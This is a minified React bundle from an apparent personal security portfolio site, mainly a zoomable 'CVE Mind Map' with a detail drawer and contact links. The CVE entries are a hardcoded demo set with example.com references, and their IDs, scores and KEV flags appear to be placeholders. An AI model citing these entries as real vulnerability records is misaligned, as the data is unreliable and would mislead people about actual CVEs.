t.r;if(s=e[1],t.x=-s.r,s.x=t.r,s.y=0,!(i>2))return t.r+s.r;qc(s,t,r=e[2]),t=new lr(t),s=new lr(s),r=new lr(r),t.next=r.previous=s,s.next=t.previous=r,r.next=s.previous=t;e:for(o=3;o<i;++o){qc(t._,s._,r=e[o]),r=new lr(r),c=s.next,p=t.previous,d=s._.r,h=t._.r;do if(d<=h){if(Xc(c._,r._)){s=c,t.next=s,s.previous=t,--o;continue e}d+=c._.r,c=c.next}else{if(Xc(p._,r._)){t=p,t.next=s,s.previous=t,--o;continue e}h+=p._.r,p=p.previous}while(c!==p.next);for(r.previous=t,r.next=s,t.next=s.previous=s=r,a=Kc(t);(r=r.next)!==s;)(l=Kc(r))<a&&(t=r,a=l);s=t.next}for(t=[s._],r=s;(r=r.next)!==s;)t.push(r._);for(r=w1(t,n),o=0;o<i;++o)t=e[o],t.x-=r.x,t.y-=r.y;return r.r}function _1(e){return Math.sqrt(e.value)}function E1(){var e=null,n=1,t=1,s=Gc;function r(i){const a=g1();return i.x=n/2,i.y=t/2,e?i.eachBefore(Qc(e)).eachAfter(na(s,.5,a)).eachBefore(Zc(1)):i.eachBefore(Qc(_1)).eachAfter(na(Gc,1,a)).eachAfter(na(s,i.r/Math.min(n,t),a)).eachBefore(Zc(Math.min(n,t)/(2*i.r))),i}return r.radius=function(i){return arguments.length?(e=p1(i),r):e},r.size=function(i){return arguments.length?(n=+i[0],t=+i[1],r):[n,t]},r.padding=function(i){return arguments.length?(s=typeof i=="function"?i:h1(+i),r):s},r}function Qc(e){return function(n){n.children||(n.r=Math.max(0,+e(n)||0))}}function na(e,n,t){return function(s){if(r=s.children){var r,i,a=r.length,l=e(s)*n||0,o;if(l)for(i=0;i<a;++i)r[i].r+=l;if(o=S1(r,t),l)for(i=0;i<a;++i)r[i].r-=l;s.r=o+l}}}function Zc(e){return function(n){var t=n.parent;n.r*=e,t&&(n.x=t.x+e*n.x,n.y=t.y+e*n.y)}}function Kt(e,n,t){this.k=e,this.x=n,this.y=t}Kt.prototype={constructor:Kt,scale:function(e){return e===1?this:new Kt(this.k*e,this.x,this.y)},translate:function(e,n){return e===0&n===0?this:new Kt(this.k,this.x+this.k*e,this.y+this.k*n)},apply:function(e){return[e[0]*this.k+this.x,e[1]*this.k+this.y]},applyX:function(e){return e*this.k+this.x},applyY:function(e){return e*this.k+this.y},invert:function(e){return[(e[0]-this.x)/this.k,(e[1]-this.y)/this.k]},invertX:function(e){return(e-this.x)/this.k},invertY:function(e){return(e-this.y)/this.k},rescaleX:function(e){return e.copy().domain(e.range().map(this.invertX,this).map(e.invert,e))},rescaleY:function(e){return e.copy().domain(e.range().map(this.invertY,this).map(e.invert,e))},toString:function(){return"translate("+this.x+","+this.y+") scale("+this.k+")"}};Kt.prototype;const Jc=["#f2d35f","#8fd6ff","#c3a3ff","#7be0b5","#ffb3b3"];function T1(e){const n=e%Jc.length;return Jc[n]}function C1({data:e,onSelectCve:n,onFocusPath:t}){const[r,i]=b.useState(null),[a,l]=b.useState([]),[o,c]=b.useState(null),[p,d]=b.useState([760/2,760/2,760/2]);b.useEffect(()=>{if(!e)return;const x=oo(e).sum(g=>g.value||1).sort((g,k)=>(k.value||0)-(g.value||0)),f=E1().size([760,760]).padding(6)(x);i(f),l(f.descendants()),c(f),d([f.x,f.y,f.r]),t==null||t([f.data.name])},[e,t]);const h=b.useMemo(()=>o?760/(p[2]*2):1,[o,p,760]),v=b.useMemo(()=>o?[760/2-p[0]*h,760/2-p[1]*h]:[0,0],[o,p,h,760]),y=x=>{c(x),d([x.x,x.y,x.r]);const m=x.ancestors().reverse().map(f=>f.data.name);t==null||t(m)},w=x=>{if(x){if(x.data.nodeType==="cve"){n==null||n(x.data);return}y(x)}};return r?u.jsx("div",{className:"cve-map-viz",children:u.jsx("svg",{viewBox:"0 0 760 760",role:"presentation",children:u.jsx("g",{children:a.map(x=>{const m=x.x*h+v[0],f=x.y*h+v[1],g=Math.max(2,x.r*h),k=x.depth,_=!x.children,T=_?"#1f2430":T1(k),C=_?"#f2f2f2":"#1f2430",E=g>30;return u.jsxs("g",{className:`cve-node depth-${k} ${_?"leaf":"branch"}`,transform:`translate(${m},${f})`,onClick:()=>w(x),style:{cursor:"pointer"},children:[u.jsx("circle",{r:g,fill:T,fillOpacity:_?.9:.7,stroke:"#1f2430",strokeOpacity:.08}),E&&u.jsx("text",{textAnchor:"middle",dy:"0.35em",fontSize:Math.min(18,g/4),fill:C,children:x.data.name})]},`${x.data.name}-${x.depth}-${x.x}-${x.y}`)})})})}):u.jsx("div",{className:"card-placeholder",children:"Loading CVE map…"})}function N1({cve:e,onClose:n}){var t;return u.jsxs("aside",{className:`cve-drawer ${e?"open":""}`,"aria-label":"CVE details",children:[u.jsxs("div",{className:"cve-drawer__header",children:[u.jsxs("div",{children:[u.jsx("p",{className:"pill",children:"CVE Detail"}),u.jsx("h3",{children:(e==null?void 0:e.id)||"Select a CVE"})]}),u.jsx("button",{className:"button ghost",type:"button",onClick:n,children:"Close"})]}),e?u.jsxs("div",{className:"cve-drawer__body",children:[u.jsx("p",{className:"cve-title",children:e.title}),u.jsxs("div",{className:"cve-meta",children:[u.jsxs("span",{className:"pill",children:["Severity: ",e.severity]}),u.jsxs("span",{className:"pill",children:["CVSS: ",e.cvss]}),u.jsx("span",{className:`pill ${e.kev?"kev":""}`,children:e.kev?"KEV":"Not KEV"}),u.jsxs("span",{className:"pill",children:["Year: ",e.year]})]}),u.jsx("p",{children:e.summary}),(t=e.references)!=null&&t.length?u.jsxs("div",{className:"cve-links",children:[u.jsx("h4",{children:"References"}),u.jsx("ul",{children:e.references.map(s=>u.jsx("li",{children:u.jsx("a",{href:s,target:"_blank",rel:"noreferrer",children:s})},s))})]}):null]}):u.jsx("p",{className:"text-muted",children:"Click a CVE node to see details here."})]})}const A1=[{id:"cloud",name:"Cloud",metrics:{total:420,kev:18,maxCvss:9.8,latestYear:2025},technologies:[{id:"aws-iam",name:"AWS IAM",metrics:{total:74,kev:4,maxCvss:9,latestYear:2025},clusters:[{id:"2025-critical",label:"2025 · Critical",kind:"severity",metrics:{total:4,kev:1,maxCvss:9.8,latestYear:2025},cves:[{id:"CVE-2025-10010",title:"AWS IAM policy wildcard privilege escalation",severity:"Critical",cvss:9.8,year:2025,kev:!0,summary:"Wildcard principal on cross-account role enables unintended assumeRole and lateral movement.",references:["https://example.com/advisory/iam-2025-10010"]},{id:"CVE-2025-12001",title:"IAM session tagging bypass",severity:"High",cvss:8.6,year:2025,kev:!1,summary:"Session tags not validated under certain SAML flows allow privilege creep.",references:["https://example.com/blog/iam-session-tagging"]}]},{id:"2024-high",label:"2024 · High",kind:"severity",metrics:{total:3,kev:0,maxCvss:8.2,latestYear:2024},cves:[{id:"CVE-2024-41001",title:"Conditional policy logic bypass",severity:"High",cvss:8.2,year:2024,kev:!1,summary:"Malformed condition key evaluation permits unintended resource access.",references:["https://example.com/advisory/iam-41001"]}]}]},{id:"kubernetes",name:"Kubernetes",metrics:{total:112,kev:7,maxCvss:9.8,latestYear:2025},clusters:[{id:"2025-priv-esc",label:"2025 · PrivEsc",kind:"cwe",metrics:{total:5,kev:1,maxCvss:9.4,latestYear:2025},cves:[{id:"CVE-2025-21001",title:"kubelet RunPodSandbox path traversal",severity:"High",cvss:9,year:2025,kev:!0,summary:"Malicious runtime config enables hostPath escape via pod sandbox setup.",references:["https://example.com/k8s/runpodsandbox"]},{id:"CVE-2025-21005",title:"API server authn cache poisoning",severity:"High",cvss:8.8,year:2025,kev:!1,summary:"Race in authenticator cache allows replay of stale tokens during fail-open windows.",references:["https://example.com/k8s/authn-cache"]}]},{id:"2024-network",label:"2024 · Net",kind:"year",metrics:{total:4,kev:0,maxCvss:7.5,latestYear:2024},cves:[{id:"CVE-2024-32001",title:"Ingress controller header smuggling",severity:"Medium",cvss:6.5,year:2024,kev:!1,summary:"Improper canonicalization permits smuggling past backend auth.",references:["https://example.com/k8s/ingress-headers"]}]}]}]},{id:"os",name:"Operating Systems",metrics:{total:610,kev:23,maxCvss:10,latestYear:2025},technologies:[{id:"linux-kernel",name:"Linux Kernel",metrics:{total:380,kev:17,maxCvss:10,latestYear:2025},clusters:[{id:"2025-overflow",label:"2025 · Overflow",kind:"cwe",metrics:{total:6,kev:2,maxCvss:9.8,latestYear:2025},cves:[{id:"CVE-2025-12020",title:"netfilter nft_payload buffer overflow",severity:"Critical",cvss:9.8,year:2025,kev:!0,summary:"Bounds check omission in nft_payload leads to OOB write from crafted netlink.",references:["https://example.com/kernel/nft_payload"]},{id:"CVE-2025-14001",title:"io_uring SQE refcount underflow",severity:"High",cvss:8.4,year:2025,kev:!1,summary:"Race on submission queue entries permits UAF and potential LPE.",references:["https://example.com/kernel/io_uring"]}]},{id:"2024-mem",label:"2024 · Memory Safety",kind:"year",metrics:{total:4,kev:0,maxCvss:7.8,latestYear:2024},cves:[{id:"CVE-2024-33010",title:"xfrm policy double free",severity:"High",cvss:7.8,year:2024,kev:!1,summary:"Error path double free reachable via malformed XFRM policy update.",references:["https://example.com/kernel/xfrm-double-free"]}]}]},{id:"openssl",name:"OpenSSL",metrics:{total:88,kev:3,maxCvss:9.8,latestYear:2025},clusters:[{id:"2025-crypto",label:"2025 · Crypto",kind:"cwe",metrics:{total:2,kev:0,maxCvss:8,latestYear:2025},cves:[{id:"CVE-2025-20001",title:"PKCS#7 parsing OOB read",severity:"High",cvss:7.5,year:2025,kev:!1,summary:"Unbounded length handling in PKCS#7 CMS parsing can leak heap bytes.",references:["https://example.com/openssl/pkcs7"]}]},{id:"2024-crypto",label:"2024 · Crypto",kind:"year",metrics:{total:1,kev:0,maxCvss:7.4,latestYear:2024},cves:[{id:"CVE-2024-35010",title:"DTLS replay window bypass",severity:"Medium",cvss:7.4,year:2024,kev:!1,summary:"Logic flaw in replay window advancement allows limited packet replay.",references:["https://example.com/openssl/dtls-replay"]}]}]}]}];function P1(){return{name:"CVE Map",children:A1.map(e=>({...e,name:e.name,children:e.technologies.map(n=>({...n,name:n.name,children:n.clusters.map(t=>({...t,name:t.label,children:t.cves.map(s=>({...s,name:`${s.id}`,value:s.cvss||1,nodeType:"cve"})),nodeType:"cluster"})),nodeType:"technology"})),nodeType:"domain"})),nodeType:"root"}}const eu={headline:"Zoom into technologies and see clustered CVEs. Click a CVE to open its details.",datasetHint:"Demo dataset; wire NVD feeds + your own aggregations for production."};function L1(){const e=b.useMemo(()=>P1(),[]),[n,t]=b.useState(null),[s,r]=b.useState([]),[i,a]=b.useState(0),l=c=>{t(c)},o=()=>{t(null),r([]),a(c=>c+1)};return u.jsx("div",{className:"hud-workspace cve-map-page",children:u.jsxs(Wn,{title:"CVE Mind Map",subtitle:"zoomable clusters",initialSize:{width:1180},children:[u.jsx("header",{className:"blog-welcome-section",children:u.jsxs("div",{className:"container text-center",children:[u.jsx("h1",{children:"CVE Mind Map"}),u.jsx("p",{className:"blog-subtitle",children:eu.headline}),u.jsx("p",{className:"blog-subtitle",children:eu.datasetHint})]})}),u.jsxs("section",{className:"container cve-map-layout",children:[u.jsxs("div",{className:"cve-map-controls",children:[u.jsxs("div",{children:[u.jsx("p",{className:"pill",children:"Progressive disclosure"}),u.jsx("h2",{children:"Zoom into Domain → Tech → Cluster → CVE"}),u.jsxs("ul",{className:"cve-map-guidelines",children:[u.jsx("li",{children:"Click a bubble to zoom deeper."}),u.jsx("li",{children:"Clusters group CVEs by severity/year/theme to avoid overload."}),u.jsx("li",{children:"Click a CVE bubble to open its detail drawer."})]}),s.length?u.jsxs("p",{className:"breadcrumb",children:["Path: ",s.join(" / ")]}):u.jsx("p",{className:"breadcrumb",children:"Path: CVE Map"})]}),u.jsx("div",{className:"cve-map-actions",children:u.jsx("button",{className:"button ghost",type:"button",onClick:o,children:"Reset View"})})]}),u.jsxs("div",{className:"cve-map-content",children:[u.jsx("div",{className:"cve-map-card",children:u.jsx(C1,{data:e,onSelectCve:l,onFocusPath:r},i)}),u.jsx(N1,{cve:n,onClose:()=>t(null)})]})]})]})})}function R1(){const e="hemparekh1596@gmail.com",[n,t]=b.useState(!1),s=()=>{navigator.clipboard&&navigator.clipboard.writeText(e).then(()=>{t(!0),setTimeout(()=>t(!1),1800)}).catch(()=>{})};return u.jsx("section",{className:"contact-strip",id:"contact",children:u.jsxs("div",{className:"container contact-grid",children:[u.jsxs("div",{children:[u.jsx("p",{className:"pill",children:"Let’s talk"}),u.jsx("h2",{children:"Signal received. Drop a note and let’s build secure systems."}),u.jsx("p",{className:"contact-blurb",children:"Let’s connect to collaborate on security engineering or privacy-focused initiatives."}),n&&u.jsx("p",{className:"contact-blurb",children:"Copied. Channel armed with end-to-end noise."})]}),u.jsxs("div",{className:"contact-actions",children:[u.jsx("button",{className:"button primary",onClick:s,type:"button",children:"Copy Email"}),u.jsx("a",{className:"button ghost",href:"https://www.linkedin.com/in/hem-parekh/",target:"_blank",rel:"noreferrer",children:"LinkedIn"}),u.jsx("a",{className:"button ghost",href:"https://github.com/Hem1700",target:"_blank",rel:"noreferrer",children:"GitHub"})]})]})})}function O1(){const[e,n]=b.useState(0);return b.useEffect(()=>{const t=()=>{const{scrollTop:s,scrollHeight:r,clientHeight:i}=document.documentElement,a=r>i?s/(r-i)*100:0;n(Math.min(100,Math.max(0,a)))};return t(),window.addEventListener("scroll",t,{passive:!0}),()=>window.removeEventListener("scroll",t)},[]),u.jsx("div",{className:"scroll-progress",children:u.jsx("div",{className:"scroll-progress__bar",style:{width:`${e}%`}})})}function j1(){const[e,n]=b.useState(!1);return b.useEffect(()=>{const t=()=>n(window.scrollY>400);return window.addEventListener("scroll",t,{passive:!0}),t(),()=>window.removeEventListener("scroll",t)},[]),e?u.jsx("button",{className:"back-to-top",type:"button","aria-label":"Back to top",title:"Back to top",onClick:()=>window.scrollTo({top:0,behavior:"smooth"}),children:"↑"}):null}function I1(){const[e,n]=b.useState(()=>typeof window>"u"?"light":localStorage.getItem("theme")||"light");return b.useEffect(()=>{const s=document.body;s.classList.remove("light","dark"),s.classList.add(e),localStorage.setItem("theme",e)},[e]),{theme:e,toggleTheme:()=>{n(s=>s==="light"?"dark":"light")}}}function M1(){const{theme:e,toggleTheme:n}=I1(),[t,s]=b.useState(!0),[r,i]=b.useState(!0),a=b.useCallback((o,c)=>{const p=document.body;p&&(o?p.classList.remove("hud-scanlines-off"):p.classList.add("hud-scanlines-off"),c?p.classList.remove("hud-noise-off"):p.classList.add("hud-noise-off"))},[]);b.useEffect(()=>{try{const o=localStorage.getItem("hud:scanlines")!=="off",c=localStorage.getItem("hud:noise")!=="off";s(o),i(c),a(o,c)}catch{a(!0,!0)}},[a]),b.useEffect(()=>{try{localStorage.setItem("hud:scanlines",t?"on":"off"),localStorage.setItem("hud:noise",r?"on":"off")}catch{}a(t,r)},[t,r,a]);const l=b.useCallback(()=>{if(typeof window<"u"){window.dispatchEvent(new CustomEvent("hud:reset-layout",{detail:"all"}));try{Object.keys(localStorage).filter(o=>o.startsWith("hud:window:")||o.startsWith("hud:")).forEach(o=>localStorage.removeItem(o))}catch{}}},[]);return b.useEffect(()=>{const o=c=>{if(!((c.ctrlKey||c.metaKey)&&c.shiftKey))return;const p=c.key.toLowerCase();p==="r"&&(c.preventDefault(),l()),p==="s"&&(c.preventDefault(),s(d=>!d)),p==="n"&&(c.preventDefault(),i(d=>!d))};return window.addEventListener("keydown",o),()=>window.removeEventListener("keydown",o)},[l]),u.jsx(Pg,{children:u.jsxs("div",{className:"app-shell",children:[u.jsx(O1,{}),u.jsx(jg,{onToggleTheme:n,theme:e}),u.jsx("main",{children:u.jsxs(Sg,{children:[u.jsx(un,{path:"/",element:u.jsx(Ac,{})}),u.jsx(un,{path:"/blogs",element:u.jsx(nv,{})}),u.jsx(un,{path:"/projects",element:u.jsx(_v,{})}),u.jsx(un,{path:"/certifications",element:u.jsx(Nv,{})}),u.jsx(un,{path:"/blog/:slug",element:u.jsx(wv,{})}),u.jsx(un,{path:"/cve-map",element:u.jsx(L1,{})}),u.jsx(un,{path:"*",element:u.jsx(Ac,{})})]})}),u.jsx(R1,{}),u.jsx(Ig,{}),u.jsx(j1,{})]})})}fd(document.getElementById("root")).render(u.jsx(pu.StrictMode,{children:u.jsx(M1,{})}));
